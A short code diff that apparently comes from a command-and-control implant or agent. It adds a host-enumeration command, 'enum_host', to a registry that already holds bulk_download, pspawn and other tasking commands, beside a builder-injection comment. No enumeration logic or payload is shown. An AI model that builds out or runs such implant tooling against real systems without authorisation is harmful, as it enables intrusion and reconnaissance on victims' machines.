@@ -38,6 +38,7 @@ from commands import zip as cmd_zip
 from commands import bulk_download as cmd_bulk_download
 from commands import unzip as cmd_unzip
 from commands import pspawn as cmd_pspawn
+from commands import enum_host as cmd_enum_host
 
 
 # --- Injected by builder via string substitution ---
@@ -153,6 +154,7 @@ COMMANDS = {
     "bulk_download": cmd_bulk_download.execute,
     "unzip":         cmd_unzip.execute,
     "pspawn":   cmd_pspawn.execute,
+    "enum_host": cmd_enum_host.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
